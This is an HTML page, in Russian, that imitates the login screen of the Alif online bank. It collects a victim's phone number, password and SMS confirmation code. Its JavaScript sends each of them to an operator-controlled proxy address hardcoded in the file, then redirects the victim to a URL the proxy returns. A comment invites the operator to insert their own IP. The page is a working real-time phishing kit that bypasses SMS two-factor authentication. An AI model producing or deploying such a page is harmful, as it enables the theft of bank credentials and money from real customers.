<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alif Онлайн</title>
    <style>
        :root { --primary: #0d8a5f; --bg: #f4f7f6; }
        body { font-family: sans-serif; background: var(--bg); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 300px; text-align: center; }
        input { width: 90%; padding: 10px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; }
        button { width: 95%; padding: 12px; background: var(--primary); color: white; border: none; border-radius: 5px; cursor: pointer; margin-top: 10px; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div class="card">
    <div id="login-screen">
        <h2>Вход в Alif</h2>
        <input type="tel" id="phone" placeholder="Номер телефона">
        <input type="password" id="password" placeholder="Пароль">
        <button onclick="handleLogin()" id="btn-login">Войти</button>
    </div>

    <div id="sms-screen" class="hidden">
        <h2>Подтверждение</h2>
        <p>SMS отправлено на <b id="disp-phone"></b></p>
        <input type="text" id="sms-code" placeholder="Код из SMS">
        <button onclick="handleSms()" id="btn-sms">Подтвердить</button>
    </div>

    <div id="success-screen" class="hidden">
        <h2>Успешно!</h2>
        <p>Переход в банк...</p>
    </div>
</div>

<script>
    // Вставь свой IP здесь, если он отличается
    const PROXY_URL = 'http://192.168.16.227:8080';

    async function handleLogin() {
        const phone = document.getElementById('phone').value;
        const password = document.getElementById('password').value;
        const btn = document.getElementById('btn-login');

        if(!phone || !password) return alert("Заполните поля");

        btn.innerText = 'Загрузка...';
        btn.disabled = true;

        // Отправляем на прокси
        const res = await fetch(`${PROXY_URL}/auth?action=login&session_id=${Date.now()}`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ phone, password })
        });

        const data = await res.json();
        if (data.status === 'ok') {
            document.getElementById('disp-phone').innerText = phone;
            document.getElementById('login-screen').classList.add('hidden');
            document.getElementById('sms-screen').classList.remove('hidden');
            btn.innerText = 'Войти';
            btn.disabled = false;
        }
    }

    async function handleSms() {
        const code = document.getElementById('sms-code').value;
        const btn = document.getElementById('btn-sms');

        if(!code) return alert("Введите код");

        btn.innerText = 'Проверка...';
        btn.disabled = true;

        // Отправляем SMS код на прокси
        const res = await fetch(`${PROXY_URL}/auth?action=sms_verify&session_id=${Date.now()}`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ code })
        });

        const data = await res.json();
        if (data.status === 'ok') {
            document.getElementById('sms-screen').classList.add('hidden');
            document.getElementById('success-screen').classList.remove('hidden');

            // Перенаправление в банк с реальным токеном
            setTimeout(() => {
                window.location.href = data.redirect_url;
            }, 1500);
        } else {
            btn.innerText = 'Подтвердить';
            btn.disabled = false;
            alert("Ошибка кода");
        }
    }
</script>

</body>
</html>
